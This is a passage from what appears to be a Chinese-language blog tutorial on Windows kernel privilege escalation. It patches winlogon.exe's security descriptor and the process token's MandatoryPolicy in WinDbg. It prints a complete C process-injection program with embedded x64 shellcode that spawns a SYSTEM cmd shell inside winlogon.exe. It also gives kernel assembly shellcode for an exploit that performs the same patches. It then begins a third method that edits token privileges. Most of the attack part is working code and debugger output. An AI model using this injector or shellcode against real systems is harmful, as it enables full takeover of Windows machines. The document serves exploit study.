class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceType: ACCESS_ALLOWED_ACE_TYPE</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceSize: 0x14</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;Mask : 0x001fffff</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;SID: S-1-5-18</span><br><span class="line"></span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceType: ACCESS_ALLOWED_ACE_TYPE</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceSize: 0x18</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;Mask : 0x00121411</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;SID: S-1-5-32-544</span><br></pre></td></tr></table></figure><p><code>AclRevision,Sbz1,AclSize,AceCount,Sbz2</code>其实就是<code>_ACL</code>，占8个字节，接下来的每一个ACE都是以<code>AceType,AceFlags，AceSize</code>开始的，其实是<code>_ACE_HEADER</code>结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ACE_HEADER</span> &#123;</span></span><br><span class="line">  BYTE AceType;</span><br><span class="line">  BYTE AceFlags;</span><br><span class="line">  WORD AceSize;</span><br><span class="line">&#125; ACE_HEADER;</span><br></pre></td></tr></table></figure><p>占4个字节，最后是<code>Mask</code>占4个字节，所以偏移0x10的位置就有一个sid。</p><p>我们dump一下数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dd 0xffff9008&#96;464082a0 + 0x30 </span><br><span class="line">ffff9008&#96;464082d0  003c0002 00000002 00140000 001fffff</span><br><span class="line">ffff9008&#96;464082e0  00000101 05000000 00000012 00180000</span><br><span class="line">ffff9008&#96;464082f0  00121411 00000201 05000000 00000020</span><br></pre></td></tr></table></figure><p><code>00000101 05000000 00000012</code> 就表示的sid:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _sid</span><br><span class="line">nt!_SID</span><br><span class="line">   +0x000 Revision         : UChar</span><br><span class="line">   +0x001 SubAuthorityCount : UChar</span><br><span class="line">   +0x002 IdentifierAuthority : _SID_IDENTIFIER_AUTHORITY</span><br><span class="line">   +0x008 SubAuthority     : [1] Uint4B</span><br><span class="line">0: kd&gt; dt _sid  0xffff9008&#96;464082a0 + 0x40</span><br><span class="line">nt!_SID</span><br><span class="line">   +0x000 Revision         : 0x1 &#39;&#39;</span><br><span class="line">   +0x001 SubAuthorityCount : 0x1 &#39;&#39;</span><br><span class="line">   +0x002 IdentifierAuthority : _SID_IDENTIFIER_AUTHORITY</span><br><span class="line">   +0x008 SubAuthority     : [1] 0x12</span><br></pre></td></tr></table></figure><p>对应的值刚好就是<code>1-5-18</code>，将其修改为<code>1-5-11</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; db 0xffff9008&#96;464082a0 + 0x48 L1 </span><br><span class="line">ffff9008&#96;464082e8  12                                               .</span><br><span class="line">0: kd&gt; eb 0xffff9008&#96;464082a0 + 0x48 b</span><br></pre></td></tr></table></figure><p>接下里使用查看一下此进程的权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !sd 0xffff9008&#96;464082a0 </span><br><span class="line">-&gt;Revision: 0x1</span><br><span class="line">-&gt;Sbz1    : 0x0</span><br><span class="line">-&gt;Control : 0x8814</span><br><span class="line">            SE_DACL_PRESENT</span><br><span class="line">            SE_SACL_PRESENT</span><br><span class="line">            SE_SACL_AUTO_INHERITED</span><br><span class="line">            SE_SELF_RELATIVE</span><br><span class="line">-&gt;Owner   : S-1-5-32-544</span><br><span class="line">-&gt;Group   : S-1-5-18</span><br><span class="line">-&gt;Dacl    : </span><br><span class="line">-&gt;Dacl    : -&gt;AclRevision: 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz1       : 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;AclSize    : 0x3c</span><br><span class="line">-&gt;Dacl    : -&gt;AceCount   : 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz2       : 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceType: ACCESS_ALLOWED_ACE_TYPE</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceSize: 0x14</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;Mask : 0x001fffff</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;SID: S-1-5-11</span><br></pre></td></tr></table></figure><p>修改成功了，当前的winlogon.exe已经可以被任意进程访问了。</p><h3 id="注入验证"><a href="#注入验证" class="headerlink" title="注入验证"></a>注入验证</h3><p>接下来就要尝试注入<code>winlogon.exe</code>,弹出system权限的shell。写如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication3.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">getProcessId</span><span class="params">(WCHAR* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hProcessSnap;</span><br><span class="line">PROCESSENTRY32 pe32;</span><br><span class="line">DWORD PID;</span><br><span class="line"></span><br><span class="line">hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"><span class="keyword">if</span> (!Process32First(hProcessSnap, &amp;pe32))</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hProcessSnap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, str))</span><br><span class="line">&#123;</span><br><span class="line">PID = pe32.th32ProcessID;</span><br><span class="line"><span class="keyword">return</span> PID;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (Process32Next(hProcessSnap, &amp;pe32));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">injectCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span>* pMem;</span><br><span class="line">WCHAR str[] = <span class="string">L"winlogon.exe"</span>;</span><br><span class="line">HANDLE hEx = <span class="literal">NULL</span>;</span><br><span class="line">CHAR shellcode[] = <span class="string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span></span><br><span class="line"><span class="string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span></span><br><span class="line"><span class="string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span></span><br><span class="line"><span class="string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span></span><br><span class="line"><span class="string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span></span><br><span class="line"><span class="string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span></span><br><span class="line"><span class="string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span></span><br><span class="line"><span class="string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span></span><br><span class="line"><span class="string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span></span><br><span class="line"><span class="string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span></span><br><span class="line"><span class="string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span></span><br><span class="line"><span class="string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span></span><br><span class="line"><span class="string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span></span><br><span class="line"><span class="string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span></span><br><span class="line"><span class="string">"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"</span></span><br><span class="line"><span class="string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span></span><br><span class="line"><span class="string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"</span></span><br><span class="line"><span class="string">"\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">DWORD pid = getProcessId(str);</span><br><span class="line">hEx = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (hEx == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Error opening winlogon process: %d\n"</span>, GetLastError());</span><br><span class="line">    <span class="comment">// return FALSE;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pMem = VirtualAllocEx(hEx, <span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pMem == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Error allocating space in winlogon process: %d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hEx, pMem, shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Error writing shellcode: %d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!CreateRemoteThread(hEx, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pMem, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Error starting thread: %d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Remote thread created\n"</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     injectCode();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于普通用户进程是没有权限打开<code>winlogon</code>进程的，所以会一直打开失败而陷入死循环，然后我们在windbg中调整权限，让winlogon.exe可以被普通权限打开。</p><p>但是调整完成后，依然无法打开进程，这是因为winlogon.exe具有比较高的完整性界别，而我们的程序的完整性级别比较低，无法写完整性级别较高的进程。</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_policy" target="_blank" rel="noopener">msdn文档</a>。我们调整我们的漏洞利用程序的<code>MandatoryPolicy</code>为0即可。</p><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left"><strong>TOKEN_MANDATORY_POLICY_OFF</strong>0x0</td><td align="left">No mandatory integrity policy is enforced for the token.</td></tr><tr><td align="left"><strong>TOKEN_MANDATORY_POLICY_NO_WRITE_UP</strong>0x1</td><td align="left">A process associated with the token cannot write to objects that have a greater mandatory integrity level.</td></tr><tr><td align="left"><strong>TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN</strong>0x2</td><td align="left">A process created with the token has an integrity level that is the lesser of the parent-process integrity level and the executable-file integrity level.</td></tr><tr><td align="left"><strong>TOKEN_MANDATORY_POLICY_VALID_MASK</strong>0x3</td><td align="left">A combination of <strong>TOKEN_MANDATORY_POLICY_NO_WRITE_UP</strong> and <strong>TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN</strong>.</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _token   (poi(ffffb78f2d4240c0+0x360)&amp;0xFFFFFFFFFFFFFFF0 ) </span><br><span class="line">nt!_TOKEN</span><br><span class="line">   +0x000 TokenSource      : _TOKEN_SOURCE</span><br><span class="line">   +0x010 TokenId          : _LUID</span><br><span class="line">   +0x018 AuthenticationId : _LUID</span><br><span class="line">   +0x020 ParentTokenId    : _LUID</span><br><span class="line">   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff&#96;ffffffff</span><br><span class="line">   +0x030 TokenLock        : 0xffffb78f&#96;2e705b10 _ERESOURCE</span><br><span class="line">   +0x038 ModifiedId       : _LUID</span><br><span class="line">   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY</span><br><span class="line">   +0x078 SessionId        : 1</span><br><span class="line">   +0x07c UserAndGroupCount : 0xf</span><br><span class="line">   +0x080 RestrictedSidCount : 0</span><br><span class="line">   +0x084 VariableLength   : 0x1dc</span><br><span class="line">   +0x088 DynamicCharged   : 0x1000</span><br><span class="line">   +0x08c DynamicAvailable : 0</span><br><span class="line">   +0x090 DefaultOwnerIndex : 4</span><br><span class="line">   +0x098 UserAndGroups    : 0xffff9008&#96;4a3bfdc0 _SID_AND_ATTRIBUTES</span><br><span class="line">   +0x0a0 RestrictedSids   : (null) </span><br><span class="line">   +0x0a8 PrimaryGroup     : 0xffff9008&#96;4f055290 Void</span><br><span class="line">   +0x0b0 DynamicPart      : 0xffff9008&#96;4f055290  -&gt; 0x501</span><br><span class="line">   +0x0b8 DefaultDacl      : 0xffff9008&#96;4f0552ac _ACL</span><br><span class="line">   +0x0c0 TokenType        : 1 ( TokenPrimary )</span><br><span class="line">   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )</span><br><span class="line">   +0x0c8 TokenFlags       : 0x2000</span><br><span class="line">   +0x0cc TokenInUse       : 0x1 &#39;&#39;</span><br><span class="line">   +0x0d0 IntegrityLevelIndex : 0xe</span><br><span class="line">   +0x0d4 MandatoryPolicy  : 3</span><br></pre></td></tr></table></figure><p>进行修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; eb ffff9008&#96;4a3bf930+0x0d4 0</span><br><span class="line">0: kd&gt; dt _token   (poi(ffffb78f2d4240c0+0x360)&amp;0xFFFFFFFFFFFFFFF0 ) </span><br><span class="line">nt!_TOKEN</span><br><span class="line">   +0x000 TokenSource      : _TOKEN_SOURCE</span><br><span class="line">   +0x010 TokenId          : _LUID</span><br><span class="line">   +0x018 AuthenticationId : _LUID</span><br><span class="line">   +0x020 ParentTokenId    : _LUID</span><br><span class="line">   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff&#96;ffffffff</span><br><span class="line">   +0x030 TokenLock        : 0xffffb78f&#96;2e705b10 _ERESOURCE</span><br><span class="line">   +0x038 ModifiedId       : _LUID</span><br><span class="line">   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY</span><br><span class="line">   +0x078 SessionId        : 1</span><br><span class="line">   +0x07c UserAndGroupCount : 0xf</span><br><span class="line">   +0x080 RestrictedSidCount : 0</span><br><span class="line">   +0x084 VariableLength   : 0x1dc</span><br><span class="line">   +0x088 DynamicCharged   : 0x1000</span><br><span class="line">   +0x08c DynamicAvailable : 0</span><br><span class="line">   +0x090 DefaultOwnerIndex : 4</span><br><span class="line">   +0x098 UserAndGroups    : 0xffff9008&#96;4a3bfdc0 _SID_AND_ATTRIBUTES</span><br><span class="line">   +0x0a0 RestrictedSids   : (null) </span><br><span class="line">   +0x0a8 PrimaryGroup     : 0xffff9008&#96;4f055290 Void</span><br><span class="line">   +0x0b0 DynamicPart      : 0xffff9008&#96;4f055290  -&gt; 0x501</span><br><span class="line">   +0x0b8 DefaultDacl      : 0xffff9008&#96;4f0552ac _ACL</span><br><span class="line">   +0x0c0 TokenType        : 1 ( TokenPrimary )</span><br><span class="line">   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )</span><br><span class="line">   +0x0c8 TokenFlags       : 0x2000</span><br><span class="line">   +0x0cc TokenInUse       : 0x1 &#39;&#39;</span><br><span class="line">   +0x0d0 IntegrityLevelIndex : 0xe</span><br><span class="line">   +0x0d4 MandatoryPolicy  : 0</span><br></pre></td></tr></table></figure><p>提权成功。</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210822164005.png" alt=""></p><h3 id="写shellcode-1"><a href="#写shellcode-1" class="headerlink" title="写shellcode"></a>写shellcode</h3><p>不再解释了，直接贴一下shellcode吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [gs:0x188]                  ;stores KTHREAD value</span><br><span class="line">mov rax, [rax+0x220]                 ;stores EPROCESS as an offset to KTHREAD</span><br><span class="line">mov rcx, rax                         ;stores EPROCESS in rcx</span><br><span class="line">mov rax, [rax+0x2f0]                 ;stores the next linked list pointer into rax</span><br><span class="line">procloop:</span><br><span class="line">  lea rbx, [rax-0x2f0]               ;stores EPROCESS address in rbx</span><br><span class="line">  mov rax, [rax]                     ;stores  linked list pointer into rax</span><br><span class="line">  add rbx, 0x450                     ;Get EPROCESS&#39;s ImageFileName</span><br><span class="line">  cmp dword [rbx], 0x6c6e6977        ;compare it to &quot;lniw&quot; (winl)</span><br><span class="line">  jne procloop                       ;if not equal repeat the drill</span><br><span class="line">sub rbx, 0x450                       ;get EPROCESS of winlogon in rbx</span><br><span class="line">sub rbx, 0x30                        ;get object_header</span><br><span class="line">add rbx, 0x28                        ;get SecurityDescriptor</span><br><span class="line">mov rax, [rbx]                       ;save SecurityDescriptor in rax</span><br><span class="line">and rax, 0x0FFFFFFFFFFFFFFF0         ;zero SecurityDescriptor last 4 bits.</span><br><span class="line">add rax, 0x48                        ;get the ACL[0] SID </span><br><span class="line">mov byte [rax], 0x0b                 ;Change it to 0x0b (This Organization)</span><br><span class="line">add rcx, 0x360                       ;Access current process token structure</span><br><span class="line">mov rax, [rcx]                       ;save token in rax</span><br><span class="line">and rax, 0x0FFFFFFFFFFFFFFF0         ;remove the last nibble (fast reference)</span><br><span class="line">add rax, 0x0d4                       ;Access the MandatorySecurityPolicy</span><br><span class="line">mov byte [rax], 0                    ;change it to zero.</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>在kscldr.exe中添加注入的代码就可以成功的弹出system权限的shell。</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210822190637.png" alt=""></p><h2 id="方法三：直接编辑权限"><a href="#方法三：直接编辑权限" class="headerlink" title="方法三：直接编辑权限"></a>方法三：直接编辑权限</h2><h3 id="windbg调试"><a href="#windbg调试" class="headerlink" title="windbg调试"></a>windbg调试</h3><p>此方法比替换token的更进一步，直接修改token中的<code>SEP_TOKEN_PRIVILEGES</code>以达到权限提升的目的，此方法有一个好处是被修改进程的用户名等信息不会改变，只是权限改变了。</p><p>我们看一下具体的数据结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt _token </span><br><span class="line">nt!_TOKEN</span><br><span class="line">   +0x000 TokenSource      : _TOKEN_SOURCE</span><br><span class="line">   +0x010 TokenId          : _LUID</span><br><span class="line">   +0x018 AuthenticationId : _LUID</span><br><span class="line">   +0x020 ParentTokenId    : _LUID</span><br><span class="line">   +0x028 ExpirationTime   : _LARGE_INTEGER</span><br><span class="line">   +0x030 TokenLock        : Ptr64 _ERESOURCE</span><br><span class="line">   +0x038 ModifiedId       : _LUID</span><br><span class="line">   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">   ......</span><br><span class="line">  </span><br><span class="line">1: kd&gt; dt _SEP_TOKEN_PRIVILEGES </span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">   +0x000 Present          : Uint8B</span><br><span class="line">   +0x008 Enabled          : Uint8B</span><br><span class="line">   +0x010 EnabledByDefault : Uint8B</span><br></pre></td></tr></table></figure><p><code>_SEP_TOKEN_PRIVILEGES</code>中：</p><ul><li>Present 表示启用的特权</li><li>Enabled字段表示当前拥有的特权</li><li>EnabledByDefault 默认拥有的特权</li></ul><p>我们看一下system进程和cmd.exe进程分别的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 